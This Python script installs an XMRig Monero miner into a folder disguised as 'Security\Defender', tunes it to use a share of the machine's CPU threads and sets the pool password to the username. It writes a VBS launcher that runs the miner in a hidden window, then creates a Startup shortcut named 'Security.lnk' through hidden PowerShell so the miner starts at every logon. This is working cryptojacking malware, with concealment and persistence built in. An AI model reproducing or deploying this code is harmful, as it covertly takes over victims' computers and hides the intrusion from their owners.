import os
import json
import math
import shutil
import getpass
import subprocess

Script_Dir   = os.path.dirname(os.path.abspath(__file__))
XMR_Source   = os.path.join(Script_Dir, "XMR")

User_Name    = getpass.getuser()
Security_Dir = os.path.join("C:\\Users", User_Name, "Security")
Defender_Dir = os.path.join(Security_Dir, "Defender")
Dest_Config  = os.path.join(Defender_Dir, "config.json")
Dest_Vbs     = os.path.join(Defender_Dir, "Start.vbs")
Xmrig_Exe    = os.path.join(Defender_Dir, "xmrig.exe")
Startup_Dir  = os.path.join(
    "C:\\Users", User_Name,
    "AppData", "Roaming", "Microsoft", "Windows",
    "Start Menu", "Programs", "Startup"
)
Lnk_Path     = os.path.join(Startup_Dir, "Security.lnk")

Total_Threads = os.cpu_count() or 1

if Total_Threads <= 7:
    Mine_Threads = 1
elif Total_Threads <= 10:
    Mine_Threads = 2
elif Total_Threads <= 13:
    Mine_Threads = 3
elif Total_Threads <= 15:
    Mine_Threads = 5
elif Total_Threads <= 18:
    Mine_Threads = 6
elif Total_Threads <= 21:
    Mine_Threads = 7
elif Total_Threads <= 25:
    Mine_Threads = 10
else:
    Mine_Threads = math.floor(Total_Threads * 0.4)

os.makedirs(Security_Dir, exist_ok=True)
if os.path.exists(Defender_Dir):
    shutil.rmtree(Defender_Dir)
shutil.copytree(XMR_Source, Defender_Dir)

with open(Dest_Config, "r") as F:
    Config = json.load(F)

Config["cpu"].pop("max-threads-hint", None)
Config["cpu"]["threads"] = [{"id": I, "intensity": 100, "affinity": -1} for I in range(Mine_Threads)]

for Pool in Config.get("pools", []):
    Pool["pass"] = User_Name

with open(Dest_Config, "w") as F:
    json.dump(Config, F, indent=4)

Vbs_Lines = (
    'Set WshShell = CreateObject("WScript.Shell")\r\n'
    f'WshShell.CurrentDirectory = "{Defender_Dir}"\r\n'
    f'WshShell.Run "{Xmrig_Exe}", 0, False\r\n'
)
with open(Dest_Vbs, "w") as F:
    F.write(Vbs_Lines)

os.makedirs(Startup_Dir, exist_ok=True)

Ps_Command = (
    f'$Ws = New-Object -ComObject WScript.Shell; '
    f'$Sc = $Ws.CreateShortcut("{Lnk_Path}"); '
    f'$Sc.TargetPath = "{Dest_Vbs}"; '
    f'$Sc.WorkingDirectory = "{Defender_Dir}"; '
    f'$Sc.Save()'
)
subprocess.run(
    ["powershell", "-WindowStyle", "Hidden", "-Command", Ps_Command],
    check=True
)
